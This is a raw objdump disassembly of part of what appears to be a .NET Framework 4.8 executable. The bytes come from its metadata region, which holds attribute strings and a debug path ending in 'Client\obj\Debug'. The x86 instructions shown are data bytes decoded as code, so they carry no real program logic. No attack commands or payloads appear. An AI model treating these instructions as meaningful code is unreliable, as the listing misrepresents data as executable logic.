  4079fa:	81 55 02 12 81 51 05 	adcl   $0x5518112,0x2(%ebp)
  407a01:	20 00                	and    %al,(%eax)
  407a03:	12 81 59 03 20 00    	adc    0x200359(%ecx),%al
  407a09:	0e                   	push   %cs
  407a0a:	0b 20                	or     (%eax),%esp
  407a0c:	04 01                	add    $0x1,%al
  407a0e:	0e                   	push   %cs
  407a0f:	12 81 5d 11 81 61    	adc    0x6181115d(%ecx),%al
  407a15:	02 09                	add    (%ecx),%cl
  407a17:	20 04 01             	and    %al,(%ecx,%eax,1)
  407a1a:	12 81 69 1c 08 08    	adc    0x8081c69(%ecx),%al
  407a20:	0c 20                	or     $0x20,%al
  407a22:	05 12 7d 1d 05       	add    $0x51d7d12,%eax
  407a27:	08 08                	or     %cl,(%eax)
  407a29:	12 81 6d 1c 06 00    	adc    0x61c6d(%ecx),%al
  407a2f:	01 11                	add    %edx,(%ecx)
  407a31:	81 75 0e 10 07 0c 08 	xorl   $0x80c0710,0xe(%ebp)
  407a38:	02 02                	add    (%edx),%al
  407a3a:	02 0a                	add    (%edx),%cl
  407a3c:	02 12                	add    (%edx),%dl
  407a3e:	80 81 08 02 02 02 02 	addb   $0x2,0x2020208(%ecx)
  407a45:	05 20 01 08 12       	add    $0x12080120,%eax
  407a4a:	7d 06                	jge    0x407a52
  407a4c:	00 02                	add    %al,(%edx)
  407a4e:	08 1d 05 08 06 00    	or     %bl,0x60805
  407a54:	03 0e                	add    (%esi),%ecx
  407a56:	0e                   	push   %cs
  407a57:	0e                   	push   %cs
  407a58:	0e                   	push   %cs
  407a59:	07                   	pop    %es
  407a5a:	20 03                	and    %al,(%ebx)
  407a5c:	08 1d 05 08 08 06    	or     %bl,0x6080805
  407a62:	20 01                	and    %al,(%ecx)
  407a64:	01 12                	add    %edx,(%edx)
  407a66:	81 81 04 20 01 01 1c 	addl   $0x9070f1c,0x1012004(%ecx)
  407a6d:	0f 07 09 
  407a70:	1c 02                	sbb    $0x2,%al
  407a72:	1d 05 02 02 12       	sbb    $0x12020205,%eax
  407a77:	80 85 08 1d 05 02 06 	addb   $0x6,0x2051d08(%ebp)
  407a7e:	00 02                	add    %al,(%edx)
  407a80:	01 1c 10             	add    %ebx,(%eax,%edx,1)
  407a83:	02 05 00 01 1d 05    	add    0x51d0100,%al
  407a89:	08 07                	or     %al,(%edi)
  407a8b:	20 02                	and    %al,(%edx)
  407a8d:	02 08                	add    (%eax),%cl
  407a8f:	11 81 89 07 20 03    	adc    %eax,0x3200789(%ecx)
  407a95:	01 1d 05 08 08 05    	add    %ebx,0x5080805
  407a9b:	20 01                	and    %al,(%ecx)
  407a9d:	01 1d 05 04 20 01    	add    %ebx,0x1200405
  407aa3:	01 0a                	add    %ecx,(%edx)
  407aa5:	04 00                	add    $0x0,%al
  407aa7:	01 01                	add    %eax,(%ecx)
  407aa9:	1c 05                	sbb    $0x5,%al
  407aab:	07                   	pop    %es
  407aac:	01 12                	add    %edx,(%edx)
  407aae:	80 89 06 20 01 12 80 	orb    $0x80,0x12012006(%ecx)
  407ab5:	89 0e                	mov    %ecx,(%esi)
  407ab7:	04 20                	add    $0x20,%al
  407ab9:	00 1d 05 03 00 00    	add    %bl,0x305
  407abf:	01 23                	add    %esp,(%ebx)
  407ac1:	07                   	pop    %es
  407ac2:	10 12                	adc    %dl,(%edx)
  407ac4:	80 8d 0e 02 12 80 91 	orb    $0x91,-0x7fedfdf2(%ebp)
  407acb:	1d 05 0e 1d 12       	sbb    $0x121d0e05,%eax
  407ad0:	80 95 08 12 80 95 02 	adcb   $0x2,-0x6a7fedf8(%ebp)
  407ad7:	02 12                	add    (%edx),%dl
  407ad9:	80 99 12 80 9d 02 12 	sbbb   $0x12,0x29d8012(%ecx)
  407ae0:	80 a1 12 49 05 00 02 	andb   $0x2,0x54912(%ecx)
  407ae7:	0e                   	push   %cs
  407ae8:	0e                   	push   %cs
  407ae9:	0e                   	push   %cs
  407aea:	05 00 00 12 80       	add    $0x80120000,%eax
  407aef:	95                   	xchg   %eax,%ebp
  407af0:	05 20 00 12 81       	add    $0x81120020,%eax
  407af5:	95                   	xchg   %eax,%ebp
  407af6:	06                   	push   %es
  407af7:	00 00                	add    %al,(%eax)
  407af9:	1d 12 80 95 05       	sbb    $0x5958012,%eax
  407afe:	00 01                	add    %al,(%ecx)
  407b00:	0e                   	push   %cs
  407b01:	1d 0e 06 20 01       	sbb    $0x120060e,%eax
  407b06:	01 11                	add    %edx,(%ecx)
  407b08:	81 9d 08 00 01 12 80 	sbbl   $0x80129580,0x12010008(%ebp)
  407b0f:	95 12 80 
  407b12:	99                   	cltd
  407b13:	04 06                	add    $0x6,%al
  407b15:	12 80 9d 09 20 02    	adc    0x220099d(%eax),%al
  407b1b:	12 80 9d 0e 11 81    	adc    -0x7eeef163(%eax),%al
  407b21:	a9 05 20 02 01       	test   $0x1022005,%eax
  407b26:	0e                   	push   %cs
  407b27:	1c 07                	sbb    $0x7,%al
  407b29:	20 02                	and    %al,(%edx)
  407b2b:	01 0e                	add    %ecx,(%esi)
  407b2d:	11 81 b1 03 00 00    	adc    %eax,0x3b1(%ecx)
  407b33:	0e                   	push   %cs
  407b34:	05 07 03 0a 02       	add    $0x20a0307,%eax
  407b39:	02 03                	add    (%ebx),%al
  407b3b:	20 00                	and    %al,(%eax)
  407b3d:	0a 04 07             	or     (%edi,%eax,1),%al
  407b40:	02 02                	add    (%edx),%al
  407b42:	02 04 20             	add    (%eax,%eiz,1),%al
  407b45:	01 02                	add    %eax,(%edx)
  407b47:	0e                   	push   %cs
  407b48:	11 07                	adc    %eax,(%edi)
  407b4a:	07                   	pop    %es
  407b4b:	12 80 a5 12 80 a9    	adc    -0x567fed5b(%eax),%al
  407b51:	12 80 ad 12 80 b1    	adc    -0x4e7fed53(%eax),%al
  407b57:	0e                   	push   %cs
  407b58:	02 02                	add    (%edx),%al
  407b5a:	05 20 00 12 80       	add    $0x80120020,%eax
  407b5f:	a9 05 20 00 12       	test   $0x12002005,%eax
  407b64:	80 ad 05 20 00 12 80 	subb   $0x80,0x12002005(%ebp)
  407b6b:	b1 04                	mov    $0x4,%cl
  407b6d:	20 01                	and    %al,(%ecx)
  407b6f:	1c 0e                	sbb    $0xe,%al
  407b71:	03 20                	add    (%eax),%esp
  407b73:	00 18                	add    %bl,(%eax)
  407b75:	05 07 03 02 18       	add    $0x18020307,%eax
  407b7a:	02 03                	add    (%ebx),%al
  407b7c:	20 00                	and    %al,(%eax)
  407b7e:	08 03                	or     %al,(%ebx)
  407b80:	07                   	pop    %es
  407b81:	01 0e                	add    %ecx,(%esi)
  407b83:	03 00                	add    (%eax),%eax
  407b85:	00 08                	add    %cl,(%eax)
  407b87:	05 00 00 12 81       	add    $0x81120000,%eax
  407b8c:	c9                   	leave
  407b8d:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  407b92:	1c 0f                	sbb    $0xf,%al
  407b94:	07                   	pop    %es
  407b95:	07                   	pop    %es
  407b96:	12 80 b5 1d 05 12    	adc    0x12051db5(%eax),%al
  407b9c:	80 b9 1d 05 08 05 0e 	cmpb   $0xe,0x508051d(%ecx)
  407ba3:	06                   	push   %es
  407ba4:	20 01                	and    %al,(%ecx)
  407ba6:	1d 05 1d 05 06       	sbb    $0x6051d05,%eax
  407bab:	20 01                	and    %al,(%ecx)
  407bad:	12 80 b9 0e 05 20    	adc    0x20050eb9(%eax),%al
  407bb3:	02 0e                	add    (%esi),%cl
  407bb5:	08 08                	or     %cl,(%eax)
  407bb7:	0b 07                	or     (%edi),%eax
  407bb9:	04 12                	add    $0x12,%al
  407bbb:	80 89 02 11 80 bd 1d 	orb    $0x1d,-0x427feefe(%ecx)
  407bc2:	05 05 20 02 0e       	add    $0xe022005,%eax
  407bc7:	0e                   	push   %cs
  407bc8:	0e                   	push   %cs
  407bc9:	03 00                	add    (%eax),%eax
  407bcb:	00 02                	add    %al,(%edx)
  407bcd:	05 20 00 11 80       	add    $0x80110020,%eax
  407bd2:	bd 05 00 00 12       	mov    $0x12000005,%ebp
  407bd7:	81 d9 06 20 01 01    	sbb    $0x1012006,%ecx
  407bdd:	12 81 d9 06 20 01    	adc    0x12006d9(%ecx),%al
  407be3:	02 11                	add    (%ecx),%dl
  407be5:	81 e1 13 07 06 12    	and    $0x12060713,%ecx
  407beb:	80 a5 15 12 80 c1 01 	andb   $0x1,-0x3e7fedeb(%ebp)
  407bf2:	0e                   	push   %cs
  407bf3:	12 80 ad 12 80 b1    	adc    -0x4e7fed53(%eax),%al
  407bf9:	02 0e                	add    (%esi),%cl
  407bfb:	06                   	push   %es
  407bfc:	15 12 80 c1 01       	adc    $0x1c18012,%eax
  407c01:	0e                   	push   %cs
  407c02:	05 20 01 01 13       	add    $0x13010120,%eax
  407c07:	00 05 20 00 1d 13    	add    %al,0x131d0020
  407c0d:	00 06                	add    %al,(%esi)
  407c0f:	00 02                	add    %al,(%edx)
  407c11:	0e                   	push   %cs
  407c12:	0e                   	push   %cs
  407c13:	1d 0e 12 07 06       	sbb    $0x607120e,%eax
  407c18:	1d 12 80 c5 1d       	sbb    $0x1dc58012,%eax
  407c1d:	12 80 c5 08 12 80    	adc    -0x7fedf73b(%eax),%al
  407c23:	c5 02                	lds    (%edx),%eax
  407c25:	12 80 c5 06 00 00    	adc    0x6c5(%eax),%al
  407c2b:	1d 12 80 c5 05       	sbb    $0x5c58012,%eax
  407c30:	20 00                	and    %al,(%eax)
  407c32:	11 81 e5 09 00 02    	adc    %eax,0x20009e5(%ecx)
  407c38:	02 11                	add    (%ecx),%dl
  407c3a:	81 e5 11 81 e5 08    	and    $0x8e58111,%ebp
  407c40:	07                   	pop    %es
  407c41:	04 12                	add    $0x12,%al
  407c43:	80 b9 18 02 0e 02 06 	cmpb   $0x6,0x20e0218(%ecx)
  407c4a:	08 07                	or     %al,(%edi)
  407c4c:	20 03                	and    %al,(%ebx)
  407c4e:	01 02                	add    %eax,(%edx)
  407c50:	0e                   	push   %cs
  407c51:	10 02                	adc    %al,(%edx)
  407c53:	06                   	push   %es
  407c54:	00 01                	add    %al,(%ecx)
  407c56:	01 12                	add    %edx,(%edx)
  407c58:	81 ed 08 07 03 12    	sub    $0x12030708,%ebp
  407c5e:	80 9d 02 12 49 08 20 	sbbb   $0x20,0x8491202(%ebp)
  407c65:	03 01                	add    (%ecx),%eax
  407c67:	0e                   	push   %cs
  407c68:	1c 11                	sbb    $0x11,%al
  407c6a:	81 f5 0a 07 04 12    	xor    $0x1204070a,%ebp
  407c70:	80 9d 1c 1d 05 12 49 	sbbb   $0x49,0x12051d1c(%ebp)
  407c77:	06                   	push   %es
  407c78:	20 01                	and    %al,(%ecx)
  407c7a:	12 80 9d 0e 02 1d    	adc    0x1d020e9d(%eax),%al
  407c80:	05 07 20 02 12       	add    $0x12022007,%eax
  407c85:	80 9d 0e 02 1e 07 0b 	sbbb   $0xb,0x71e020e(%ebp)
  407c8c:	12 80 89 0e 0e 12    	adc    0x120e0e89(%eax),%al
  407c92:	80 89 02 12 80 89 12 	orb    $0x12,-0x767fedfe(%ecx)
  407c99:	49                   	dec    %ecx
  407c9a:	15 11 80 d9 01       	adc    $0x1d98011,%eax
  407c9f:	12 80 89 12 80 89    	adc    -0x767fed77(%eax),%al
  407ca5:	02 12                	add    (%edx),%dl
  407ca7:	49                   	dec    %ecx
  407ca8:	08 15 12 80 c1 01    	or     %dl,0x1c18012
  407cae:	12 80 89 11 10 01    	adc    0x1101189(%eax),%al
  407cb4:	01 15 12 80 c1 01    	add    %edx,0x1c18012
  407cba:	1e                   	push   %ds
  407cbb:	00 15 12 81 fd 01    	add    %dl,0x1fd8112
  407cc1:	1e                   	push   %ds
  407cc2:	00 05 0a 01 12 80    	add    %al,0x8012010a
  407cc8:	89 09                	mov    %ecx,(%ecx)
  407cca:	20 00                	and    %al,(%eax)
  407ccc:	15 11 80 d9 01       	adc    $0x1d98011,%eax
  407cd1:	13 00                	adc    (%eax),%eax
  407cd3:	08 15 11 80 d9 01    	or     %dl,0x1d98011
  407cd9:	12 80 89 04 20 00    	adc    0x200489(%eax),%al
  407cdf:	13 00                	adc    (%eax),%eax
  407ce1:	05 20 01 02 13       	add    $0x13020120,%eax
  407ce6:	00 09                	add    %cl,(%ecx)
  407ce8:	07                   	pop    %es
  407ce9:	03 12                	add    (%edx),%edx
  407ceb:	80 dd 12             	sbb    $0x12,%ch
  407cee:	80 e1 1c             	and    $0x1c,%cl
  407cf1:	05 00 00 12 82       	add    $0x82120000,%eax
  407cf6:	01 06                	add    %eax,(%esi)
  407cf8:	00 01                	add    %al,(%ecx)
  407cfa:	1d 05 1d 05 07       	sbb    $0x7051d05,%eax
  407cff:	20 01                	and    %al,(%ecx)
  407d01:	12 80 dd 1d 05 06    	adc    0x6051ddd(%eax),%al
  407d07:	20 01                	and    %al,(%ecx)
  407d09:	12 80 e1 0e 06 00    	adc    0x60ee1(%eax),%al
  407d0f:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  407d12:	80 e1 08             	and    $0x8,%cl
  407d15:	00 01                	add    %al,(%ecx)
  407d17:	12 80 e1 11 82 0d    	adc    0xd8211e1(%eax),%al
  407d1d:	09 00                	or     %eax,(%eax)
  407d1f:	02 12                	add    (%edx),%dl
  407d21:	82 11 11             	adcb   $0x11,(%ecx)
  407d24:	82 15 0e 1c 00 05 12 	adcb   $0x12,0x5001c0e
  407d2b:	82 1d 11 82 21 0e 15 	sbbb   $0x15,0xe218211
  407d32:	12 81 fd 01 12 80    	adc    -0x7fedfe03(%ecx),%al
  407d38:	e1 12                	loope  0x407d4c
  407d3a:	80 e1 15             	and    $0x15,%cl
  407d3d:	12 81 fd 01 12 82    	adc    -0x7dedfe03(%ecx),%al
  407d43:	11 1b                	adc    %ebx,(%ebx)
  407d45:	15 12 80 e5 01       	adc    $0x1e58012,%eax
  407d4a:	15 12 80 e9 0a       	adc    $0xae98012,%eax
  407d4f:	12 80 ed 1c 12 59    	adc    0x59121ced(%eax),%al
  407d55:	12 41 0e             	adc    0xe(%ecx),%al
  407d58:	1d 05 12 80 cd       	sbb    $0xcd801205,%eax
  407d5d:	0e                   	push   %cs
  407d5e:	0e                   	push   %cs
  407d5f:	0e                   	push   %cs
  407d60:	0c 00                	or     $0x0,%al
  407d62:	01 15 12 80 e5 01    	add    %edx,0x1e58012
  407d68:	13 00                	adc    (%eax),%eax
  407d6a:	12 82 1d 03 06 13    	adc    0x1306031d(%edx),%al
  407d70:	00 16                	add    %dl,(%esi)
  407d72:	15 12 80 e9 0a       	adc    $0xae98012,%eax
  407d77:	12 80 ed 1c 12 59    	adc    0x59121ced(%eax),%al
  407d7d:	12 41 0e             	adc    0xe(%ecx),%al
  407d80:	1d 05 12 80 cd       	sbb    $0xcd801205,%eax
  407d85:	0e                   	push   %cs
  407d86:	0e                   	push   %cs
  407d87:	0e                   	push   %cs
  407d88:	17                   	pop    %ss
  407d89:	20 0a                	and    %cl,(%edx)
  407d8b:	01 13                	add    %edx,(%ebx)
  407d8d:	00 13                	add    %dl,(%ebx)
  407d8f:	01 13                	add    %edx,(%ebx)
  407d91:	02 13                	add    (%ebx),%dl
  407d93:	03 13                	add    (%ebx),%edx
  407d95:	04 13                	add    $0x13,%al
  407d97:	05 13 06 13 07       	add    $0x7130613,%eax
  407d9c:	13 08                	adc    (%eax),%ecx
  407d9e:	13 09                	adc    (%ecx),%ecx
  407da0:	06                   	push   %es
  407da1:	07                   	pop    %es
  407da2:	02 02                	add    (%edx),%al
  407da4:	12 80 f1 07 20 03    	adc    0x32007f1(%eax),%al
  407daa:	01 0e                	add    %ecx,(%esi)
  407dac:	1d 05 08 05 20       	sbb    $0x20050805,%eax
  407db1:	01 1d 05 08 05 00    	add    %ebx,0x50805
  407db7:	01 0e                	add    %ecx,(%esi)
  407db9:	1d 05 13 07 07       	sbb    $0x7071305,%eax
  407dbe:	02 12                	add    (%edx),%dl
  407dc0:	80 85 12 80 f5 12 80 	addb   $0x80,0x12f58012(%ebp)
  407dc7:	f9                   	stc
  407dc8:	12 80 fd 1d 05 1d    	adc    0x1d051dfd(%eax),%al
  407dce:	05 06 20 01 01       	add    $0x1012006,%eax
  407dd3:	11 82 35 06 20 01    	adc    %eax,0x1200635(%edx)
  407dd9:	01 11                	add    %edx,(%ecx)
  407ddb:	82 39 05             	cmpb   $0x5,(%ecx)
  407dde:	20 00                	and    %al,(%eax)
  407de0:	12 82 3d 0c 20 03    	adc    0x3200c3d(%edx),%al
  407de6:	01 12                	add    %edx,(%edx)
  407de8:	81 55 12 82 3d 11 82 	adcl   $0x82113d82,0x12(%ebp)
  407def:	41                   	inc    %ecx
  407df0:	08 20                	or     %ah,(%eax)
  407df2:	03 1d 05 1d 05 08    	add    0x8051d05,%ebx
  407df8:	08 05 20 01 0e 1d    	or     %al,0x1d0e0120
  407dfe:	05 1c 07 0c 02       	add    $0x20c071c,%eax
  407e03:	12 80 85 12 80 f5    	adc    -0xa7fed7b(%eax),%al
  407e09:	1d 05 12 80 fd       	sbb    $0xfd801205,%eax
  407e0e:	1d 05 1d 05 02       	sbb    $0x2051d05,%eax
  407e13:	12 80 f9 1d 05 1d    	adc    0x1d051df9(%eax),%al
  407e19:	05 1d 05 0c 00       	add    $0xc051d,%eax
  407e1e:	05 01 12 82 4d       	add    $0x4d821201,%eax
  407e23:	08 12                	or     %dl,(%edx)
  407e25:	82 4d 08 08          	orb    $0x8,0x8(%ebp)
  407e29:	07                   	pop    %es
  407e2a:	07                   	pop    %es
  407e2b:	05 02 08 02 02       	add    $0x2020802,%eax
  407e30:	02 09                	add    (%ecx),%cl
  407e32:	00 02                	add    %al,(%edx)
  407e34:	01 12                	add    %edx,(%edx)
  407e36:	82 4d 11 82          	orb    $0x82,0x11(%ebp)
  407e3a:	55                   	push   %ebp
  407e3b:	0f 07                	sysret
  407e3d:	07                   	pop    %es
  407e3e:	1d 05 12 80 b9       	sbb    $0xb9801205,%eax
  407e43:	12 81 01 1d 05 08    	adc    0x8051d01(%ecx),%al
  407e49:	05 0e 07 07 02       	add    $0x207070e,%eax
  407e4e:	12 81 01 1d 05 08    	adc    0x8051d01(%ecx),%al
  407e54:	b7 7a                	mov    $0x7a,%bh
  407e56:	5c                   	pop    %esp
  407e57:	56                   	push   %esi
  407e58:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  407e5b:	89 08                	mov    %ecx,(%eax)
  407e5d:	b0 3f                	mov    $0x3f,%al
  407e5f:	5f                   	pop    %edi
  407e60:	7f 11                	jg     0x407e73
  407e62:	d5 0a                	aad    $0xa
  407e64:	3a 04 20             	cmp    (%eax,%eiz,1),%al
  407e67:	00 00                	add    %al,(%eax)
  407e69:	00 04 40             	add    %al,(%eax,%eax,2)
  407e6c:	00 00                	add    %al,(%eax)
  407e6e:	00 04 10             	add    %al,(%eax,%edx,1)
  407e71:	00 00                	add    %al,(%eax)
  407e73:	00 04 00             	add    %al,(%eax,%eax,1)
  407e76:	00 00                	add    %al,(%eax)
  407e78:	80 04 02 00          	addb   $0x0,(%edx,%eax,1)
  407e7c:	00 00                	add    %al,(%eax)
  407e7e:	04 01                	add    $0x1,%al
  407e80:	00 00                	add    %al,(%eax)
  407e82:	00 02                	add    %al,(%edx)
  407e84:	06                   	push   %es
  407e85:	0e                   	push   %cs
  407e86:	03 06                	add    (%esi),%eax
  407e88:	12 41 03             	adc    0x3(%ecx),%al
  407e8b:	06                   	push   %es
  407e8c:	12 3c 03             	adc    (%ebx,%eax,1),%bh
  407e8f:	06                   	push   %es
  407e90:	12 59 03             	adc    0x3(%ecx),%bl
  407e93:	06                   	push   %es
  407e94:	12 5d 03             	adc    0x3(%ebp),%bl
  407e97:	06                   	push   %es
  407e98:	1d 05 02 06 0a       	sbb    $0xa060205,%eax
  407e9d:	03 06                	add    (%esi),%eax
  407e9f:	12 61 02             	adc    0x2(%ecx),%ah
  407ea2:	06                   	push   %es
  407ea3:	02 02                	add    (%edx),%al
  407ea5:	06                   	push   %es
  407ea6:	1c 04                	sbb    $0x4,%al
  407ea8:	06                   	push   %es
  407ea9:	12 80 cd 09 06 15    	adc    0x150609cd(%eax),%al
  407eaf:	12 80 c1 01 12 80    	adc    -0x7fedfe3f(%eax),%al
  407eb5:	89 03                	mov    %eax,(%ebx)
  407eb7:	06                   	push   %es
  407eb8:	11 50 02             	adc    %edx,0x2(%eax)
  407ebb:	06                   	push   %es
  407ebc:	09 03                	or     %eax,(%ebx)
  407ebe:	06                   	push   %es
  407ebf:	11 48 1c             	adc    %ecx,0x1c(%eax)
  407ec2:	06                   	push   %es
  407ec3:	15 12 80 e5 01       	adc    $0x1e58012,%eax
  407ec8:	15 12 80 e9 0a       	adc    $0xae98012,%eax
  407ecd:	12 80 ed 1c 12 59    	adc    0x59121ced(%eax),%al
  407ed3:	12 41 0e             	adc    0xe(%ecx),%al
  407ed6:	1d 05 12 80 cd       	sbb    $0xcd801205,%eax
  407edb:	0e                   	push   %cs
  407edc:	0e                   	push   %cs
  407edd:	0e                   	push   %cs
  407ede:	04 00                	add    $0x0,%al
  407ee0:	00 12                	add    %dl,(%edx)
  407ee2:	59                   	pop    %ecx
  407ee3:	05 00 01 01 12       	add    $0x12010100,%eax
  407ee8:	59                   	pop    %ecx
  407ee9:	04 00                	add    $0x0,%al
  407eeb:	00 12                	add    %dl,(%edx)
  407eed:	5d                   	pop    %ebp
  407eee:	05 00 01 01 12       	add    $0x12010100,%eax
  407ef3:	5d                   	pop    %ebp
  407ef4:	04 00                	add    $0x0,%al
  407ef6:	00 1d 05 05 00 01    	add    %bl,0x1000505
  407efc:	01 1d 05 03 00 00    	add    %ebx,0x305
  407f02:	0a 04 00             	or     (%eax,%eax,1),%al
  407f05:	01 01                	add    %eax,(%ecx)
  407f07:	0a 04 00             	or     (%eax,%eax,1),%al
  407f0a:	00 12                	add    %dl,(%edx)
  407f0c:	61                   	popa
  407f0d:	05 00 01 01 12       	add    $0x12010100,%eax
  407f12:	61                   	popa
  407f13:	04 00                	add    $0x0,%al
  407f15:	01 01                	add    %eax,(%ecx)
  407f17:	02 03                	add    (%ebx),%al
  407f19:	00 00                	add    %al,(%eax)
  407f1b:	1c 0a                	sbb    $0xa,%al
  407f1d:	00 04 02             	add    %al,(%edx,%eax,1)
  407f20:	1c 12                	sbb    $0x12,%al
  407f22:	71 12                	jno    0x407f36
  407f24:	75 11                	jne    0x407f37
  407f26:	79 05                	jns    0x407f2d
  407f28:	00 01                	add    %al,(%ecx)
  407f2a:	01 12                	add    %edx,(%edx)
  407f2c:	7d 08                	jge    0x407f36
  407f2e:	00 01                	add    %al,(%ecx)
  407f30:	12 80 c5 12 80 c9    	adc    -0x367fed3b(%eax),%al
  407f36:	03 00                	add    (%eax),%eax
  407f38:	00 18                	add    %bl,(%eax)
  407f3a:	08 00                	or     %al,(%eax)
  407f3c:	03 08                	add    (%eax),%ecx
  407f3e:	18 12                	sbb    %dl,(%edx)
  407f40:	80 b9 08 04 00 01 18 	cmpb   $0x18,0x1000408(%ecx)
  407f47:	0e                   	push   %cs
  407f48:	06                   	push   %es
  407f49:	00 02                	add    %al,(%edx)
  407f4b:	02 18                	add    (%eax),%bl
  407f4d:	10 02                	adc    %al,(%edx)
  407f4f:	06                   	push   %es
  407f50:	00 01                	add    %al,(%ecx)
  407f52:	11 48 11             	adc    %ecx,0x11(%eax)
  407f55:	48                   	dec    %eax
  407f56:	06                   	push   %es
  407f57:	00 03                	add    %al,(%ebx)
  407f59:	01 09                	add    %ecx,(%ecx)
  407f5b:	09 09                	or     %ecx,(%ecx)
  407f5d:	07                   	pop    %es
  407f5e:	00 02                	add    %al,(%edx)
  407f60:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  407f63:	80 d5 06             	adc    $0x6,%ch
  407f66:	00 02                	add    %al,(%edx)
  407f68:	02 0e                	add    (%esi),%cl
  407f6a:	1d 05 06 00 01       	sbb    $0x1000605,%eax
  407f6f:	01 12                	add    %edx,(%edx)
  407f71:	80 89 07 20 02 02 1d 	orb    $0x1d,0x2022007(%ecx)
  407f78:	05 1d 05 04 08       	add    $0x804051d,%eax
  407f7d:	00 12                	add    %dl,(%edx)
  407f7f:	59                   	pop    %ecx
  407f80:	04 08                	add    $0x8,%al
  407f82:	00 12                	add    %dl,(%edx)
  407f84:	5d                   	pop    %ebp
  407f85:	04 08                	add    $0x8,%al
  407f87:	00 1d 05 03 08 00    	add    %bl,0x80305
  407f8d:	0a 04 08             	or     (%eax,%ecx,1),%al
  407f90:	00 12                	add    %dl,(%edx)
  407f92:	61                   	popa
  407f93:	03 08                	add    (%eax),%ecx
  407f95:	00 02                	add    %al,(%edx)
  407f97:	03 08                	add    (%eax),%ecx
  407f99:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  407f9c:	08 00                	or     %al,(%eax)
  407f9e:	08 08                	or     %cl,(%eax)
  407fa0:	01 00                	add    %eax,(%eax)
  407fa2:	08 00                	or     %al,(%eax)
  407fa4:	00 00                	add    %al,(%eax)
  407fa6:	00 00                	add    %al,(%eax)
  407fa8:	1e                   	push   %ds
  407fa9:	01 00                	add    %eax,(%eax)
  407fab:	01 00                	add    %eax,(%eax)
  407fad:	54                   	push   %esp
  407fae:	02 16                	add    (%esi),%dl
  407fb0:	57                   	push   %edi
  407fb1:	72 61                	jb     0x408014
  407fb3:	70 4e                	jo     0x408003
  407fb5:	6f                   	outsl  %ds:(%esi),(%dx)
  407fb6:	6e                   	outsb  %ds:(%esi),(%dx)
  407fb7:	45                   	inc    %ebp
  407fb8:	78 63                	js     0x40801d
  407fba:	65 70 74             	gs jo  0x408031
  407fbd:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  407fc4:	77 73                	ja     0x408039
  407fc6:	01 08                	add    %ecx,(%eax)
  407fc8:	01 00                	add    %eax,(%eax)
  407fca:	07                   	pop    %es
  407fcb:	01 00                	add    %eax,(%eax)
  407fcd:	00 00                	add    %al,(%eax)
  407fcf:	00 05 01 00 00 00    	add    %al,0x1
  407fd5:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  407fd8:	00 07                	add    %al,(%edi)
  407fda:	31 2e                	xor    %ebp,(%esi)
  407fdc:	30 2e                	xor    %ch,(%esi)
  407fde:	30 2e                	xor    %ch,(%esi)
  407fe0:	30 00                	xor    %al,(%eax)
  407fe2:	00 49 01             	add    %cl,0x1(%ecx)
  407fe5:	00 1a                	add    %bl,(%edx)
  407fe7:	2e 4e                	cs dec %esi
  407fe9:	45                   	inc    %ebp
  407fea:	54                   	push   %esp
  407feb:	46                   	inc    %esi
  407fec:	72 61                	jb     0x40804f
  407fee:	6d                   	insl   (%dx),%es:(%edi)
  407fef:	65 77 6f             	gs ja  0x408061
  407ff2:	72 6b                	jb     0x40805f
  407ff4:	2c 56                	sub    $0x56,%al
  407ff6:	65 72 73             	gs jb  0x40806c
  407ff9:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  408000:	38 01                	cmp    %al,(%ecx)
  408002:	00 54 0e 14          	add    %dl,0x14(%esi,%ecx,1)
  408006:	46                   	inc    %esi
  408007:	72 61                	jb     0x40806a
  408009:	6d                   	insl   (%dx),%es:(%edi)
  40800a:	65 77 6f             	gs ja  0x40807c
  40800d:	72 6b                	jb     0x40807a
  40800f:	44                   	inc    %esp
  408010:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  408017:	61                   	popa
  408018:	6d                   	insl   (%dx),%es:(%edi)
  408019:	65 12 2e             	adc    %gs:(%esi),%ch
  40801c:	4e                   	dec    %esi
  40801d:	45                   	inc    %ebp
  40801e:	54                   	push   %esp
  40801f:	20 46 72             	and    %al,0x72(%esi)
  408022:	61                   	popa
  408023:	6d                   	insl   (%dx),%es:(%edi)
  408024:	65 77 6f             	gs ja  0x408096
  408027:	72 6b                	jb     0x408094
  408029:	20 34 2e             	and    %dh,(%esi,%ebp,1)
  40802c:	38 08                	cmp    %cl,(%eax)
  40802e:	01 00                	add    %eax,(%eax)
	...
  40803c:	36 67 0b 9e 00 00    	or     %ss:0x0(%bp),%ebx
  408042:	00 00                	add    %al,(%eax)
  408044:	02 00                	add    (%eax),%al
  408046:	00 00                	add    %al,(%eax)
  408048:	3c 00                	cmp    $0x0,%al
  40804a:	00 00                	add    %al,(%eax)
  40804c:	70 80                	jo     0x407fce
  40804e:	00 00                	add    %al,(%eax)
  408050:	70 62                	jo     0x4080b4
	...
  40805e:	00 00                	add    %al,(%eax)
  408060:	10 00                	adc    %al,(%eax)
	...
  40806e:	00 00                	add    %al,(%eax)
  408070:	52                   	push   %edx
  408071:	53                   	push   %ebx
  408072:	44                   	inc    %esp
  408073:	53                   	push   %ebx
  408074:	9d                   	popf
  408075:	e0 ff                	loopne 0x408076
  408077:	ae                   	scas   %es:(%edi),%al
  408078:	ca 97 8c             	lret   $0x8c97
  40807b:	44                   	inc    %esp
  40807c:	93                   	xchg   %eax,%ebx
  40807d:	e9 81 15 0a 2b       	jmp    0x2b4a9603
  408082:	88 2f                	mov    %ch,(%edi)
  408084:	01 00                	add    %eax,(%eax)
  408086:	00 00                	add    %al,(%eax)
  408088:	43                   	inc    %ebx
  408089:	3a 5c 6e 65          	cmp    0x65(%esi,%ebp,2),%bl
  40808d:	77 5c                	ja     0x4080eb
  40808f:	43                   	inc    %ebx
  408090:	6c                   	insb   (%dx),%es:(%edi)
  408091:	69 65 6e 74 5c 6f 62 	imul   $0x626f5c74,0x6e(%ebp),%esp
  408098:	6a 5c                	push   $0x5c
  40809a:	44                   	inc    %esp
  40809b:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  40809f:	5c                   	pop    %esp
  4080a0:	41                   	inc    %ecx
